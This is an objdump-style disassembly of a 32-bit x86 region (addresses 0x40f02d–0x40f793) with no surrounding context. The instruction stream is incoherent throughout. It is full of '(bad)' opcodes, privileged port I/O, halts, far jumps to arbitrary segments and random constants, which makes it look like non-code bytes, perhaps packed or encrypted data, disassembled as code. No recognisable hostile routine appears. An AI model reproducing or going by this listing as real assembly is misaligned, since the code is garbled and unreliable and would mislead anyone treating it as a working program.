  40f02d:	mov    eax,0x28c1a998
  40f032:	shl    ebx,cl
  40f034:	clc    
  40f035:	mov    ah,0x36
  40f037:	retf   
  40f038:	fdivr  DWORD PTR [ecx-0x5de6ef18]
  40f03e:	jmp    0x24d9:0x7445d0bf
  40f045:	mov    al,ds:0xda3752ac
  40f04a:	lods   eax,DWORD PTR ds:[esi]
  40f04b:	pop    esp
  40f04d:	pop    esp
  40f04e:	jae    0x40f032
  40f050:	daa    
  40f051:	test   BYTE PTR [eax+0x542f8e24],dh
  40f057:	imul   ebx,DWORD PTR [ebx+0x53],0x50
  40f05b:	sub    eax,0x19a403f3
  40f060:	cmp    ebp,ebx
  40f062:	cmp    esi,DWORD PTR [edx+0x75214c76]
  40f068:	je     0x40efea
  40f06a:	(bad)  
  40f06b:	frstor [ebp-0xfb2b482]
  40f071:	data16 xor al,0xb
  40f074:	mov    esi,0xe3f4fbb1
  40f079:	jecxz  0x40f02f
  40f07b:	es dec ebp
  40f07d:	jne    0x40f092
  40f07f:	cmp    ch,BYTE PTR [ecx+ebp*2+0x10fc0dc5]
  40f086:	or     al,0xd9
  40f088:	mov    edx,0xd0eed38d
  40f08d:	jecxz  0x40f06c
  40f08f:	mov    al,0xee
  40f091:	pop    ss
  40f092:	hlt    
  40f093:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f094:	lea    edx,[edx-0x738ec22e]
  40f09a:	ins    DWORD PTR es:[edi],dx
  40f09b:	cmp    BYTE PTR ds:0xedc021ee,dl
  40f0a1:	sahf   
  40f0a2:	js     0x40f0ae
  40f0a4:	or     al,0x66
  40f0a6:	dec    esp
  40f0a7:	jl     0x40f108
  40f0a9:	xor    DWORD PTR ds:0xd550eb62,0xb9a25c1c
  40f0b3:	ds jl  0x40f061
  40f0b6:	outs   dx,BYTE PTR ds:[esi]
  40f0b7:	mov    cl,0x3c
  40f0b9:	push   edi
  40f0ba:	and    al,0x96
  40f0bc:	lods   al,BYTE PTR ds:[esi]
  40f0bd:	push   esi
  40f0be:	test   eax,0x79babeb4
  40f0c3:	jno    0x40f0fa
  40f0c5:	in     al,0x1e
  40f0c7:	xchg   esi,eax
  40f0c8:	aas    
  40f0c9:	mov    BYTE PTR ss:[ebx],ah
  40f0cc:	daa    
  40f0cd:	out    dx,eax
  40f0ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0cf:	mov    ch,0x96
  40f0d2:	scas   al,BYTE PTR es:[edi]
  40f0d3:	mov    ecx,DWORD PTR [edx+0x6e05b397]
  40f0d9:	add    bh,dl
  40f0db:	mov    edi,0x9c805c02
  40f0e0:	mov    eax,0x80c7f303
  40f0e5:	cmc    
  40f0e6:	scas   eax,DWORD PTR es:[edi]
  40f0e7:	jmp    0x40f0dc
  40f0e9:	xor    eax,ebp
  40f0eb:	ins    DWORD PTR es:[edi],dx
  40f0ec:	dec    edi
  40f0ed:	push   eax
  40f0ee:	daa    
  40f0ef:	jl     0x40f16f
  40f0f1:	inc    ecx
  40f0f2:	pop    ds
  40f0f3:	xor    BYTE PTR [ebx+0x51],dh
  40f0f6:	cmp    ebx,ebx
  40f0f8:	dec    esp
  40f0f9:	shl    BYTE PTR [esi+eiz*2+0x7],cl
  40f0fd:	add    eax,DWORD PTR [ecx+ecx*2]
  40f100:	sbb    bh,ch
  40f102:	ins    DWORD PTR es:[edi],dx
  40f103:	inc    ebx
  40f104:	hlt    
  40f105:	pop    ebp
  40f106:	and    ebx,DWORD PTR [ecx+0x5a]
  40f109:	cmp    DWORD PTR [edx],ebx
  40f10b:	cs pop ecx
  40f10d:	pop    esi
  40f10e:	ins    DWORD PTR es:[edi],dx
  40f10f:	stos   DWORD PTR es:[edi],eax
  40f110:	xor    BYTE PTR [ebp-0x29236f45],al
  40f116:	in     eax,0xc
  40f118:	dec    edx
  40f119:	sbb    eax,0xc183f3ee
  40f11e:	dec    edi
  40f11f:	or     al,0xcc
  40f121:	xor    eax,0x516ff8b2
  40f126:	mov    ah,0xf
  40f128:	js     0x40f133
  40f12a:	inc    ebx
  40f12b:	lea    ebx,[eax+0x59645a44]
  40f131:	cmp    DWORD PTR [ebp-0x277a2d38],0xf628ce32
  40f13b:	xchg   esp,eax
  40f13c:	pop    esi
  40f13d:	inc    esp
  40f13e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f13f:	pop    ebx
  40f140:	(bad)  
  40f141:	sub    bh,al
  40f143:	mov    es,WORD PTR [esp+eax*1-0x5]
  40f147:	xlat   BYTE PTR ds:[ebx]
  40f148:	push   esp
  40f149:	inc    eax
  40f14a:	pop    ebx
  40f14b:	stc    
  40f14c:	mov    ds:0xa86f8a9a,eax
  40f151:	xor    eax,0x384f162a
  40f156:	arpl   bp,cx
  40f158:	jb     0x40f1d4
  40f15a:	xor    ah,BYTE PTR [ebx+0x29039db7]
  40f160:	xor    al,0x19
  40f162:	xchg   esi,eax
  40f163:	inc    ebx
  40f164:	shl    BYTE PTR [ebp-0x6a],1
  40f167:	adc    DWORD PTR [ecx-0x629890d],eax
  40f16d:	ja     0x40f1e2
  40f16f:	mov    edi,0x73a1f343
  40f174:	ficom  DWORD PTR [esi]
  40f176:	dec    edi
  40f177:	xchg   ebp,eax
  40f178:	ret    0x5c2e
  40f17b:	xchg   ebp,eax
  40f17c:	adc    bl,BYTE PTR [edx+0x2c]
  40f17f:	sbb    eax,0xfaa7eea
  40f184:	push   ss
  40f185:	outs   dx,DWORD PTR ds:[esi]
  40f186:	loopne 0x40f1ee
  40f188:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f189:	cmp    al,0x8
  40f18b:	sti    
  40f18c:	mov    ecx,0xcacaa0f2
  40f191:	pop    esi
  40f192:	pop    eax
  40f193:	retf   
  40f194:	pop    ebx
  40f195:	sbb    eax,DWORD PTR [edx+0x3d35d169]
  40f19b:	adc    ecx,DWORD PTR [ecx+0x7f67defd]
  40f1a1:	inc    esp
  40f1a2:	mov    al,0xb1
  40f1a4:	pop    ds
  40f1a5:	mov    ecx,0xb37ba651
  40f1aa:	pop    ds
  40f1ab:	scas   al,BYTE PTR es:[edi]
  40f1ac:	retf   
  40f1ad:	xchg   ecx,eax
  40f1ae:	inc    ebp
  40f1af:	pop    ebp
  40f1b0:	cmp    BYTE PTR [ebx],bl
  40f1b2:	mov    bh,0x23
  40f1b4:	fistp  DWORD PTR [edi-0x3a]
  40f1b7:	les    esp,FWORD PTR ss:0xe52b1cfd
  40f1be:	jae    0x40f171
  40f1c0:	mov    dh,0xc5
  40f1c2:	add    al,0x13
  40f1c4:	pop    ebp
  40f1c5:	mov    ecx,0x278ad848
  40f1ca:	xlat   BYTE PTR ds:[ebx]
  40f1cb:	loope  0x40f1aa
  40f1cd:	xchg   esp,eax
  40f1ce:	mov    BYTE PTR [ecx+0x5bc2c94f],cl
  40f1d4:	pop    ds
  40f1d5:	add    al,0xf
  40f1d7:	out    dx,eax
  40f1d8:	bound  esi,QWORD PTR [ebp+0x1986c21a]
  40f1de:	(bad)  
  40f1df:	jecxz  0x40f22a
  40f1e1:	(bad)  
  40f1e2:	ins    DWORD PTR es:[edi],dx
  40f1e3:	add    DWORD PTR [edi-0x7f],0x1b3b6bcd
  40f1ea:	adc    BYTE PTR [edi+0x20],bh
  40f1ed:	or     DWORD PTR [ebp+0x3d2da507],edi
  40f1f3:	stos   BYTE PTR es:[edi],al
  40f1f4:	sub    eax,0x50124eda
  40f1f9:	mov    cl,0x8d
  40f1fb:	shr    DWORD PTR [eax-0x7a],cl
  40f1fe:	rol    DWORD PTR [ebx-0x21171a18],0x55
  40f205:	int    0x4
  40f207:	retf   0xe88b
  40f20a:	push   cs
  40f20b:	imul   esi,esp,0xffffff8c
  40f20e:	inc    esi
  40f20f:	fst    DWORD PTR [eax]
  40f211:	fwait
  40f212:	adc    BYTE PTR [edi],0x3
  40f215:	loope  0x40f1d4
  40f217:	fild   DWORD PTR [ebp-0x5d8e4bce]
  40f21d:	push   edx
  40f21e:	lock fstp QWORD PTR [bx+si-0x3a64]
  40f224:	xchg   edx,eax
  40f225:	jns    0x40f1f4
  40f227:	in     eax,dx
  40f228:	pop    eax
  40f229:	mov    eax,0x84981702
  40f22e:	test   bh,ch
  40f230:	mov    ebp,DWORD PTR [ebx+0x5d]
  40f233:	(bad)  
  40f235:	mov    edx,0xecdab83c
  40f23a:	mov    BYTE PTR [ebx+0x0],cl
  40f23d:	xlat   BYTE PTR ds:[ebx]
  40f23e:	retf   
  40f23f:	test   BYTE PTR [eax-0x7aa2a4b9],dh
  40f245:	or     al,0xd3
  40f247:	push   esi
  40f248:	pop    ss
  40f249:	popf   
  40f24a:	xchg   ebp,eax
  40f24b:	cmp    eax,0x1ee12afb
  40f250:	mov    bh,0x63
  40f252:	add    eax,0x57fd8f98
  40f257:	cli    
  40f258:	xchg   ebp,eax
  40f259:	push   0xffffffec
  40f25b:	fild   DWORD PTR [edi]
  40f25d:	pushf  
  40f25e:	jle    0x40f21c
  40f260:	(bad)  [eax-0x76]
  40f263:	cmp    BYTE PTR [edi],ah
  40f265:	adc    al,0xcf
  40f267:	lds    ecx,FWORD PTR [edx-0x56]
  40f26a:	jl     0x40f27c
  40f26c:	adc    ebx,DWORD PTR [edi-0x2eca81d8]
  40f272:	add    BYTE PTR [esp+ebp*4+0x55],0x47
  40f277:	pop    eax
  40f278:	mov    bh,0x2e
  40f27a:	inc    esi
  40f27b:	adc    al,0x6c
  40f27d:	sub    BYTE PTR [ecx],cl
  40f27f:	inc    ebx
  40f280:	jp     0x40f21e
  40f282:	(bad)  
  40f283:	stc    
  40f284:	xor    ebx,DWORD PTR [eax]
  40f286:	sub    al,0xf5
  40f288:	sub    esi,DWORD PTR [esi+0x201ed28c]
  40f28e:	lods   eax,DWORD PTR ds:[esi]
  40f28f:	pushf  
  40f290:	sub    BYTE PTR [esi+0x6140bee1],dh
  40f296:	ret    
  40f297:	xor    DWORD PTR [esi],eax
  40f299:	in     eax,dx
  40f29a:	jmp    0x72a7:0x49b96f98
  40f2a1:	in     eax,0xe8
  40f2a3:	xchg   DWORD PTR [eax-0x5f33d966],esp
  40f2a9:	or     eax,0x1c8f5a37
  40f2ae:	jmp    0xb7c2:0x6e1bcf1a
  40f2b5:	xchg   edx,eax
  40f2b6:	(bad)  
  40f2b7:	push   edi
  40f2b8:	push   eax
  40f2b9:	shl    BYTE PTR [esi+0x24e31ce7],1
  40f2bf:	jo     0x40f241
  40f2c1:	les    ecx,FWORD PTR [eax+0x4566f53c]
  40f2c7:	cmp    eax,0x161209ec
  40f2cc:	dec    eax
  40f2cd:	stos   BYTE PTR es:[edi],al
  40f2ce:	mov    WORD PTR ds:0xa218d9a8,cs
  40f2d4:	mov    esp,0xb7c02858
  40f2d9:	shl    BYTE PTR [ecx+0x23826fd8],0x9e
  40f2e0:	stos   BYTE PTR es:[edi],al
  40f2e1:	mov    esp,0x20795f7e
  40f2e6:	adc    ecx,0x3b84832a
  40f2ec:	fwait
  40f2ed:	push   0x51d79cb5
  40f2f2:	mov    bl,0x2c
  40f2f4:	add    DWORD PTR [ebx-0x52],0xffffffa9
  40f2f8:	mov    bh,BYTE PTR [edx+0x1a0814d8]
  40f2fe:	sbb    al,0xde
  40f300:	pop    ds
  40f301:	inc    esp
  40f302:	aaa    
  40f303:	mov    DWORD PTR [eax+0x3e],ecx
  40f306:	xlat   BYTE PTR ds:[ebx]
  40f307:	or     DWORD PTR [ecx+ebx*4],0xffffffda
  40f30b:	outs   dx,DWORD PTR ds:[esi]
  40f30c:	test   ah,ch
  40f30e:	and    ebp,DWORD PTR [edx]
  40f310:	sub    BYTE PTR [ebx],0x45
  40f313:	aas    
  40f314:	add    DWORD PTR [eax],ecx
  40f316:	std    
  40f317:	sti    
  40f318:	lods   eax,DWORD PTR ds:[esi]
  40f319:	pop    ebx
  40f31a:	xor    edx,ebp
  40f31c:	dec    esi
  40f31d:	dec    ecx
  40f31e:	aad    0x74
  40f320:	in     eax,0x3
  40f322:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f323:	dec    bp
  40f325:	(bad)  
  40f326:	xchg   esi,eax
  40f327:	imul   esp,DWORD PTR [ebp+ebp*1+0x63597d98],0xbe948841
  40f332:	jne    0x40f2df
  40f334:	xchg   esi,eax
  40f335:	xlat   BYTE PTR ds:[ebx]
  40f336:	jbe    0x40f3b5
  40f338:	and    ch,BYTE PTR [ebp+0x61]
  40f33b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f33c:	fnsave [ecx-0x67]
  40f33f:	iret   
  40f340:	or     ch,0x53
  40f343:	out    0x2a,eax
  40f345:	mov    bl,0x49
  40f347:	inc    esi
  40f348:	inc    ecx
  40f349:	int3   
  40f34a:	(bad)  
  40f34c:	pop    ss
  40f34d:	add    eax,0x7054cc50
  40f352:	not    BYTE PTR [esi+esi*4+0x7509ff0f]
  40f359:	stos   DWORD PTR es:[edi],eax
  40f35a:	xor    edx,0xffffffcc
  40f35d:	lods   al,BYTE PTR ds:[esi]
  40f35e:	dec    edi
  40f35f:	rcr    DWORD PTR [ecx+ebp*1],0x85
  40f363:	addr16 (bad) 
  40f365:	fmul   st,st(1)
  40f367:	fsub   DWORD PTR [edx+ecx*2-0x387dd84c]
  40f36e:	push   es
  40f36f:	ds dec esi
  40f371:	add    eax,0x844cb6f5
  40f376:	call   0x550325d0
  40f37b:	mov    WORD PTR [ecx],ds
  40f37d:	js     0x40f3bb
  40f37f:	xor    edx,DWORD PTR [edi+0x41934fd7]
  40f385:	dec    ecx
  40f386:	in     eax,dx
  40f387:	inc    ebx
  40f388:	shl    bh,0xb2
  40f38b:	add    al,0xc9
  40f38d:	out    0x82,al
  40f38f:	std    
  40f390:	add    al,BYTE PTR [ecx-0xda89e76]
  40f396:	mov    ch,0xb8
  40f398:	mov    edi,0x73b5ea04
  40f39d:	daa    
  40f39e:	inc    ebp
  40f39f:	bsr    esi,DWORD PTR ds:0x938f505f
  40f3a6:	jno    0x40f397
  40f3a8:	(bad)  
  40f3a9:	pop    esi
  40f3aa:	int3   
  40f3ab:	mov    esi,0xf4e1ef1a
  40f3b0:	inc    edi
  40f3b1:	push   esi
  40f3b2:	ss retf 
  40f3b4:	test   al,0x3b
  40f3b6:	aaa    
  40f3b7:	jo     0x40f429
  40f3b9:	mov    ebp,0x3b34750a
  40f3be:	sub    BYTE PTR [ebx+ebp*1],0xfa
  40f3c2:	jb     0x40f34a
  40f3c4:	aaa    
  40f3c5:	jae    0x40f3f7
  40f3c7:	repnz pusha 
  40f3c9:	cld    
  40f3ca:	or     al,BYTE PTR [ebx+0x66]
  40f3cd:	push   ecx
  40f3ce:	xor    DWORD PTR [ecx-0x27890887],edi
  40f3d4:	int3   
  40f3d5:	rcl    BYTE PTR [edi],0x2a
  40f3d8:	and    eax,0x9e31f9ca
  40f3dd:	mov    BYTE PTR [esi-0x6a],al
  40f3e0:	stos   BYTE PTR es:[edi],al
  40f3e1:	or     ebx,edi
  40f3e3:	adc    al,0x84
  40f3e5:	into   
  40f3e6:	ss cli 
  40f3e8:	push   esi
  40f3e9:	push   ss
  40f3ea:	pushf  
  40f3eb:	cmp    cl,BYTE PTR [edx-0x2de8012a]
  40f3f1:	call   0x683a2eaa
  40f3f6:	jb     0x40f388
  40f3f8:	jecxz  0x40f3e5
  40f3fa:	dec    ebp
  40f3fb:	xchg   esi,esi
  40f3fd:	and    edx,DWORD PTR [esi]
  40f3ff:	jae    0x40f3a3
  40f401:	cwde   
  40f402:	pop    ecx
  40f403:	and    DWORD PTR [edi-0xc],ecx
  40f406:	add    al,0x59
  40f408:	mov    al,bh
  40f40a:	clc    
  40f40b:	pop    ebx
  40f40c:	nop
  40f40d:	and    al,0xd
  40f40f:	aaa    
  40f410:	scas   eax,DWORD PTR es:[edi]
  40f411:	out    dx,eax
  40f412:	ss aam 0x89
  40f415:	adc    edi,ebx
  40f417:	in     al,0x96
  40f419:	aam    0x66
  40f41b:	xchg   esp,eax
  40f41c:	retf   
  40f41d:	jno    0x40f3c0
  40f41f:	lods   eax,DWORD PTR ds:[esi]
  40f420:	fwait
  40f421:	xchg   ebp,eax
  40f422:	daa    
  40f423:	jo     0x40f479
  40f425:	xor    ecx,DWORD PTR [eax-0x50]
  40f428:	mov    DWORD PTR [edi+edi*2-0x26b4e021],ebp
  40f42f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f430:	js     0x40f4ab
  40f432:	cmp    DWORD PTR [ebx+0x2f010571],esi
  40f438:	repnz mov ebp,DWORD PTR [esi-0x4a9bf90f]
  40f43f:	jns    0x40f457
  40f441:	cmp    eax,0xb7e08f9c
  40f446:	dec    ebx
  40f447:	or     edi,DWORD PTR [ebx+0x2c]
  40f44a:	aaa    
  40f44b:	mov    bl,0x31
  40f44d:	push   edx
  40f44e:	das    
  40f44f:	add    DWORD PTR [eax+eiz*4],eax
  40f452:	and    DWORD PTR [ebx+eax*2],esi
  40f455:	mov    dh,0xd2
  40f457:	mov    fs,esi
  40f459:	jl     0x40f473
  40f45b:	test   al,0x9a
  40f45d:	jns    0x40f47f
  40f45f:	sub    dl,BYTE PTR [edi-0xf0f317f]
  40f465:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f466:	scas   al,BYTE PTR es:[edi]
  40f467:	sub    eax,0xf4a9a668
  40f46c:	xchg   esp,eax
  40f46d:	ficomp DWORD PTR ds:0xeaa52b5d
  40f473:	add    BYTE PTR [ecx+0x75c9b910],ah
  40f479:	mov    edi,0x2d9546fa
  40f47e:	xchg   ebp,eax
  40f47f:	pop    edx
  40f480:	cmp    al,0x70
  40f482:	jae    0x40f4e0
  40f484:	mov    ds:0x8862d376,al
  40f489:	pop    ecx
  40f48a:	retf   
  40f48b:	mov    ecx,0x86497c61
  40f490:	sub    cl,BYTE PTR [ebp-0x19db08dd]
  40f496:	int    0x20
  40f498:	fsubr  st,st(7)
  40f49a:	(bad)  
  40f49b:	lods   eax,DWORD PTR ds:[esi]
  40f49c:	pop    es
  40f49d:	loope  0x40f427
  40f49f:	xor    al,0xd5
  40f4a1:	mov    al,BYTE PTR [ecx-0x23]
  40f4a4:	xor    eax,0x58858c07
  40f4a9:	pop    es
  40f4aa:	xor    edi,edx
  40f4ac:	sub    BYTE PTR [edi+eax*2-0x1bf2dbf2],dh
  40f4b3:	inc    esp
  40f4b4:	out    0xbf,al
  40f4b6:	mov    al,ds:0x8183c968
  40f4bb:	fs cmp al,0x19
  40f4be:	add    eax,0xd8588ee7
  40f4c3:	xor    esi,DWORD PTR [eax-0x18]
  40f4c6:	into   
  40f4c7:	out    0xec,eax
  40f4c9:	ins    DWORD PTR es:[edi],dx
  40f4ca:	cwde   
  40f4cb:	js     0x40f47c
  40f4cd:	in     al,dx
  40f4ce:	push   esp
  40f4cf:	lods   eax,DWORD PTR ds:[esi]
  40f4d0:	pop    es
  40f4d1:	cli    
  40f4d2:	js     0x40f534
  40f4d4:	sbb    esi,edx
  40f4d6:	sub    ebx,eax
  40f4d8:	in     eax,0x77
  40f4da:	xchg   esi,eax
  40f4db:	push   ebp
  40f4dc:	mov    WORD PTR [ebp+0x7ca53738],fs
  40f4e2:	mov    cl,BYTE PTR [esp+edx*4]
  40f4e5:	test   DWORD PTR [eax],0x1847204
  40f4eb:	push   esi
  40f4ec:	int    0x62
  40f4ee:	mov    bl,0x52
  40f4f0:	test   eax,0x21142680
  40f4f5:	jmp    0xfaa99b02
  40f4fa:	dec    ebx
  40f4fb:	imul   ebp,DWORD PTR [ecx+0x75],0x536e06e1
  40f502:	pop    ss
  40f503:	sahf   
  40f504:	mov    ah,ch
  40f506:	cdq    
  40f507:	aas    
  40f508:	mov    ds:0x1984676c,eax
  40f50d:	sub    eax,0x7969524a
  40f512:	adc    eax,0xe2bff724
  40f517:	jl     0x40f574
  40f519:	add    dl,BYTE PTR [edi+0x1053fc46]
  40f51f:	push   edi
  40f520:	inc    ebx
  40f521:	pop    eax
  40f522:	sbb    dh,BYTE PTR [edi+edx*2-0x10]
  40f526:	dec    eax
  40f527:	sub    DWORD PTR [edi-0x6],ebx
  40f52a:	push   ebp
  40f52b:	pop    edx
  40f52c:	hlt    
  40f52d:	xor    DWORD PTR [ecx-0x4b],0x58
  40f531:	cli    
  40f532:	adc    eax,0x58bbad50
  40f537:	ret    0x7cce
  40f53a:	js     0x40f573
  40f53c:	pop    eax
  40f53d:	dec    esi
  40f53e:	dec    ax
  40f540:	pop    ebx
  40f541:	push   edi
  40f542:	es push ss
  40f544:	pop    ecx
  40f545:	idiv   dl
  40f547:	jbe    0x40f5b1
  40f549:	sbb    BYTE PTR [ebp+eiz*8-0x63],0xac
  40f54e:	mov    esi,0x100a40f3
  40f553:	sub    eax,0x1212a392
  40f558:	call   0x124ec7d4
  40f55d:	mov    DWORD PTR [edi+0x18],0xcf7f8447
  40f564:	cmp    eax,0xcbfee19d
  40f569:	inc    ebx
  40f56a:	or     BYTE PTR [edx+0x6d89caba],0x7c
  40f571:	sub    DWORD PTR [edx-0x3dbe1d76],ecx
  40f577:	mov    ecx,0x49d0770
  40f57c:	mov    al,ds:0xc7d4bfd9
  40f581:	xor    BYTE PTR [eax-0x1495d920],bh
  40f587:	inc    ecx
  40f588:	adc    al,al
  40f58a:	xor    ecx,edx
  40f58c:	out    0xec,eax
  40f58e:	xor    ebx,DWORD PTR [esi-0x5e]
  40f591:	and    DWORD PTR [ebx-0x35],eax
  40f594:	xor    al,0xfb
  40f596:	clc    
  40f597:	dec    edx
  40f598:	jmp    0x51c2564a
  40f59d:	call   0xa32fa6bc
  40f5a2:	ins    BYTE PTR es:[edi],dx
  40f5a3:	push   ds
  40f5a4:	push   ds
  40f5a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5a6:	adc    eax,0x940887e4
  40f5ab:	sbb    dh,al
  40f5ad:	(bad)  
  40f5ae:	mov    edx,0x5dd05c97
  40f5b3:	or     al,0x9c
  40f5b5:	pop    ss
  40f5b6:	dec    edx
  40f5b7:	les    edx,FWORD PTR [ebx+0xc29acd3]
  40f5bd:	pop    ss
  40f5be:	lahf   
  40f5bf:	ds sbb eax,0x50c9387d
  40f5c5:	xorps  xmm3,XMMWORD PTR [edi-0x65]
  40f5c9:	stc    
  40f5ca:	add    edi,DWORD PTR [ebx-0x46]
  40f5cd:	xchg   edi,eax
  40f5ce:	and    al,0x48
  40f5d0:	sub    al,0x24
  40f5d2:	bound  ebp,QWORD PTR [ecx]
  40f5d4:	popa   
  40f5d5:	repz out dx,al
  40f5d7:	fcmovu st,st(3)
  40f5d9:	test   BYTE PTR [ebx-0x50cf9292],dh
  40f5df:	test   eax,0x74127d70
  40f5e4:	inc    edi
  40f5e5:	fimul  DWORD PTR [ebx]
  40f5e7:	jl     0x40f651
  40f5e9:	mov    edi,0x39c5043f
  40f5ee:	out    0xec,eax
  40f5f0:	gs inc eax
  40f5f2:	mov    BYTE PTR [esi-0x7c3cef85],al
  40f5f8:	(bad)  
  40f5f9:	pop    ebx
  40f5fa:	stos   BYTE PTR es:[edi],al
  40f5fb:	retf   
  40f5fc:	mov    bl,0xcf
  40f5fe:	je     0x40f645
  40f600:	loope  0x40f5b2
  40f602:	fnstsw WORD PTR [eax+0x524f294d]
  40f608:	dec    eax
  40f609:	mov    eax,ds:0x6fd264ef
  40f60e:	push   ss
  40f60f:	push   edi
  40f610:	shl    BYTE PTR [esp+ebx*4+0x47ca2271],1
  40f617:	aam    0xce
  40f619:	xor    ebx,edi
  40f61b:	push   esi
  40f61c:	pop    ebp
  40f61d:	mov    esi,0x54f43fb3
  40f622:	add    BYTE PTR [eax+0x12],dh
  40f625:	cdq    
  40f626:	mov    dl,0x5b
  40f628:	imul   edi,eax,0x3a
  40f62b:	cmp    BYTE PTR [edi+0x53],0xf
  40f62f:	lods   al,BYTE PTR ds:[esi]
  40f630:	into   
  40f631:	jae    0x40f63f
  40f633:	adc    al,0x80
  40f635:	repnz das 
  40f637:	in     al,dx
  40f638:	out    dx,eax
  40f639:	jo     0x40f64f
  40f63b:	inc    esp
  40f63c:	stos   DWORD PTR es:[edi],eax
  40f63d:	jmp    0x4d57ac2c
  40f642:	or     BYTE PTR [edi-0x60],0xcc
  40f646:	mov    ch,0x3b
  40f648:	(bad)  
  40f649:	scas   al,BYTE PTR es:[edi]
  40f64a:	outs   dx,DWORD PTR ds:[esi]
  40f64b:	mov    cl,0xe0
  40f64d:	out    0x48,eax
  40f64f:	pop    es
  40f650:	out    0x4,eax
  40f652:	in     al,dx
  40f653:	in     al,0x20
  40f655:	xchg   DWORD PTR [ebp-0x1659f9f8],ebx
  40f65b:	pop    ss
  40f65c:	jbe    0x40f642
  40f65e:	inc    ebx
  40f65f:	js     0x40f65b
  40f661:	xchg   edi,eax
  40f662:	push   ecx
  40f663:	xor    al,0xa7
  40f665:	xchg   BYTE PTR [edx+0x1e],al
  40f668:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f669:	pop    esi
  40f66a:	mov    ebx,0x2807b02b
  40f66f:	les    ebp,FWORD PTR [eax-0x78]
  40f672:	cmp    al,0x77
  40f674:	cmp    al,0x6c
  40f676:	jge    0x40f6c0
  40f678:	iret   
  40f679:	dec    edx
  40f67a:	les    ebp,FWORD PTR [edx-0x24]
  40f67d:	aaa    
  40f67e:	bsr    ebp,edx
  40f681:	(bad)  
  40f682:	in     eax,dx
  40f683:	pop    ecx
  40f684:	sbb    DWORD PTR [esi+edx*1+0x5a],ebp
  40f688:	sbb    al,BYTE PTR [eax-0x52]
  40f68b:	push   0x4e
  40f68d:	leave  
  40f68e:	add    cl,ch
  40f690:	pop    edx
  40f691:	fnstsw WORD PTR [edi-0x2a9c78e0]
  40f697:	lds    esi,FWORD PTR [ebp+0x408befc]
  40f69d:	test   bl,dl
  40f69f:	dec    esi
  40f6a0:	fstp   DWORD PTR [ebp-0x675d8702]
  40f6a6:	lahf   
  40f6a7:	sbb    eax,0x117baf25
  40f6ac:	fs pop ss
  40f6ae:	in     al,dx
  40f6af:	inc    esi
  40f6b0:	xor    al,0xce
  40f6b2:	sbb    DWORD PTR [ecx+0xf32c34],ebx
  40f6b8:	fbld   TBYTE PTR [ecx]
  40f6ba:	inc    ebx
  40f6bb:	pop    ds
  40f6bc:	stos   DWORD PTR es:[edi],eax
  40f6bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6be:	gs sbb al,0xe8
  40f6c1:	add    bl,BYTE PTR [edx]
  40f6c3:	into   
  40f6c4:	pop    esi
  40f6c5:	push   ebx
  40f6c6:	stos   DWORD PTR es:[edi],eax
  40f6c7:	cwde   
  40f6c8:	clc    
  40f6c9:	loopne 0x40f6f4
  40f6cb:	into   
  40f6cc:	popa   
  40f6cd:	mov    bh,0xe1
  40f6cf:	in     eax,0xb2
  40f6d1:	cmp    eax,0x27ba93b7
  40f6d6:	pop    edx
  40f6d7:	in     eax,0x3a
  40f6d9:	hlt    
  40f6da:	shr    DWORD PTR [edi+edi*2+0x4c669dd9],0x3c
  40f6e2:	or     eax,0x4cefc806
  40f6e7:	test   DWORD PTR [ebx],0xf44d6a22
  40f6ed:	aam    0x3d
  40f6ef:	xor    esi,DWORD PTR [eax-0x1909fce2]
  40f6f5:	mov    eax,ds:0x74a3039b
  40f6fa:	and    ebx,DWORD PTR [ebx+edx*1-0x51]
  40f6fe:	outs   dx,DWORD PTR ds:[esi]
  40f6ff:	or     ebp,DWORD PTR [ecx]
  40f701:	cmp    BYTE PTR [eax-0x74],ah
  40f704:	push   es
  40f705:	retf   0xfc1a
  40f708:	xchg   edx,eax
  40f709:	inc    esp
  40f70a:	into   
  40f70b:	jl     0x40f718
  40f70d:	add    ebp,eax
  40f70f:	push   ss
  40f710:	push   esi
  40f711:	mov    ch,0x9a
  40f713:	or     al,0x53
  40f715:	js     0x40f70f
  40f717:	mov    WORD PTR ds:0xe5fd1022,ss
  40f71d:	popf   
  40f71e:	ret    0xe6b
  40f721:	fcmovu st,st(4)
  40f723:	adc    eax,0x6cc5109f
  40f728:	inc    edi
  40f729:	push   ebp
  40f72a:	pop    ds
  40f72b:	jbe    0x40f721
  40f72d:	jno    0x40f721
  40f72f:	mov    eax,ds:0xa9049975
  40f734:	inc    edi
  40f735:	rol    BYTE PTR [ebp+0x1913bfa],0x7d
  40f73c:	int    0x4d
  40f73e:	jp     0x40f6d5
  40f740:	loope  0x40f76b
  40f742:	pop    ecx
  40f743:	(bad)  
  40f744:	outs   dx,BYTE PTR ds:[esi]
  40f745:	xchg   esp,eax
  40f746:	jne    0x40f78c
  40f748:	pop    es
  40f749:	icebp  
  40f74a:	retf   0xb627
  40f74d:	fisubr WORD PTR [eax+0x21b0aa89]
  40f753:	in     al,dx
  40f754:	lods   eax,DWORD PTR ds:[esi]
  40f755:	and    eax,0x721f0ea
  40f75a:	mov    al,ds:0x2d4f3b30
  40f75f:	test   DWORD PTR [esi],eax
  40f761:	popf   
  40f762:	fisub  DWORD PTR [eax-0x5485ea75]
  40f768:	pusha  
  40f769:	add    edi,eax
  40f76b:	scas   al,BYTE PTR es:[edi]
  40f76c:	add    ah,al
  40f76e:	test   ch,ah
  40f770:	or     DWORD PTR ss:[edi-0x5678840b],esi
  40f777:	dec    esi
  40f778:	and    ebx,esp
  40f77a:	stos   DWORD PTR es:[edi],eax
  40f77b:	div    DWORD PTR [edi-0x6cabf6ac]
  40f781:	inc    ebx
  40f782:	mov    ch,0xee
  40f784:	repz retf 0x69fe
  40f788:	dec    ebp
  40f789:	xor    BYTE PTR [esp+esi*4+0x57],al
  40f78d:	sbb    DWORD PTR [edi],esi
  40f78f:	std    
  40f790:	es and al,0x85
  40f793:	pop    esi
